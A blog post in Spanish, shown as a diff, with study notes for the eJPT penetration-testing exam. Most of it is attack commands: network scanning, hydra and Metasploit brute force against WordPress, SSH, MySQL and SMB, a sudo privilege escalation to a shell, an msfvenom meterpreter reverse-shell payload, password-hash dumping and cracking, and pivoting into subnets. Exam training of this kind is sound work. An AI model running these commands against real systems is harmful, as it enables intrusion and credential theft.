@@ -1,0 +1,314 @@
+---
+layout: post
+title:  "eJPT"
+date:   2026-02-19 14:44:32 +0100
+categories: jekyll update
+author: mrallfredii
+tags: ejpt
+---
+
+## 1. Ips vivas
+
+nmap -sn ip/24
+
+## 2. enumerar ips vivas
+
+nmap -p- -sC -sV ip_victima
+
+nmap -sS —min-rate 5000 -p- —open ip -oN tcp-scan.txt
+
+nmap -p puerto —open -sC -sV ip -Pn -oN Full_scan.txt
+
+# MAQUINA 1
+
+## 3. Apache port 80 php i enumeracion de directorios
+
+/ip/phpinfo.php
+
+dirbuster (php, txt)
+
+## 4. Wordpress
+
+wpscan —url ip/wordpress/ -e u (mostrar users -e u)
+
+wpscan —url ip/wordpress/ —passwords /usr/share/wordlist/rockyou.txt
+
+whatweb http://ip/wordpress
+
+hydra -l admin -P /usr/share/metasploit-framework/data/wordlis/unix_passwords.txt ip http-post-form ‘/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302’ (source code para el ‘user & password’)
+
+## 5. SSH
+
+searchsploit openssh version
+
+hydra -L /usr/share/metasploit-framework/data/wordlis/unix_users.txt -P /usr/share/metasploit-framework/data/wordlis/unix_passwords.txt ssh://ip
+
+## 6. Dentro terminal victima
+
+/etc/passwd
+
+crontab -l
+
+sudo -l
+
+ls -lsa
+
+## elevar privilegios (/usr/bin find)
+
+sudo find /etc/passwd -exec /bin/sh \;
+
+/bin/bash -i
+
+En otros casos buscar por google: exploit sudo find (donde en find ponemos la comanda que nos salga de sudo -l o de donde sea)
+
+---
+
+cd /var/www/html/
+
+ls
+
+cd admin/
+
+cd wordpress
+
+ls
+
+vi wp-config.php
+
+cd wp-admin/
+
+cd wp-content (plugins y temas)
+
+## 7. mysql
+
+mysql -u root -p -h ip
+
+password: enter / root / admin / metasploit:
+
+msfconsole 
+
+search mysql_login
+
+use 0
+
+options
+
+set verbose false
+
+set rhosts ip_atacante
+
+set pass_file /usr/share/metasploit-framework/data/wordlis/unix_passwords.txt
+
+run
+
+hydra -l root -P /usr/share/metasploit-framework/data/wordlis/unix_passwords.txt mysql://ip
+
+---
+
+show databases;
+
+use wordpress;
+
+show tables;
+
+select * from wp_users;
+
+## 8. Romper passwords con hash
+
+hashcat —help
+
+hashcat -m 400 -a 0 hash.txt /usr/share/wordlist/rockyou.txt
+
+## 9. Pivoting
+
+Dentro de la terminal con el usuario comprometido: 
+
+ip -c a
+
+## 10. Conseguir consola de la victima ssh
+
+msfconsole
+
+search ssh_login
+
+use 0
+
+set rhosts ip_victima
+
+set username xxx
+
+set password xxx
+
+run
+
+sessions
+
+sessions -u 1   —> session de meterpreter
+
+/bin/bash -i
+
+---
+
+## Cargar payload php con los dirs
+
+ip/admin/
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=ip_atacante lport=1234 -f elf > hola.elf
+
+en terminal de meterpreter: upload hola.elf
+
+# MAQUINA 2
+
+## SMB
+
+nmap -p445 —script smb-protocol ip
+
+nmap -p445 —script smb-enum-shares ip
+
+nmap -p445 —script smb-enum-sessions ip
+
+smbclient -N -L ip
+
+smbclient  //ip/user
+
+rpcclient -U “” ip
+
+help
+
+srvinfo
+
+enumdomusers
+
+querydominfo
+
+enum4linux ip -a
+
+smbmap -H ip -u “” -p “”
+
+---
+
+hydra -P users.txt -L passwords.txt smb://ip
+
+msfconsole
+
+search smb_login
+
+use 0
+
+set…
+
+run
+
+msfconsole
+
+search smb_login
+
+use 0
+
+set SMUSER poner_user_comanda_anterior
+
+set PASS_FILE /usr/share/dicc
+
+run
+
+---
+
+### Entrar SMB windows:
+
+msfconsole
+
+search psexec type:exploit
+
+use 1
+
+set…
+
+run
+
+help
+
+sysinfo
+
+getuid
+
+getprivs
+
+hashdump
+
+pgrep lsass (proceso que encargado de authority)
+
+migrate 464 (pid)
+
+hashdump
+
+shell
+
+net users
+
+search
+
+search -f file.ext
+
+---
+
+shell
+
+whoami /priv
+
+query user
+
+net users username
+
+hostanem
+
+systeminfo
+
+---
+
+## Dumpeo de passwords encontradas encriptadas
+
+john —format=NT hashes.tx —wordlist=/usr/share/wordlistt/rockyou.txt
+
+(nt hash = windows encriptacion)
+
+---
+
+## Pivoting windows a subred desde metasploit
+
+run arp_scanner -r ip.0/24
+
+1. Agregar la nueva ip de la subred a mi router table de la maquina atacante con la terminal de la intermedia:
+
+run autoroute -s ip_subred.0/24
+
+arp -a 
+
+route print
+
+1. Escanear red
+
+use auxilary/scanner/portscan/tcp
+
+show options
+
+set…
+
+run
+
+## Port forwarding para kali a subred
+
+### Terminal metrepreter
+
+portfwd add -l 2233 -p 445 -r ip_victima_subred
+
+(desde mi puerto 2233 se entra a la consola de meatasploit y se comunica con el puerto 445)
+
+portfwd list
+
+### Terminal kali
+
+nmap -p 2233 ip_vicitma_subred
+
+ip_vicitma_subred se puede poner localhost
+
+nmap -sV -sS -p 2233 -sC localhost
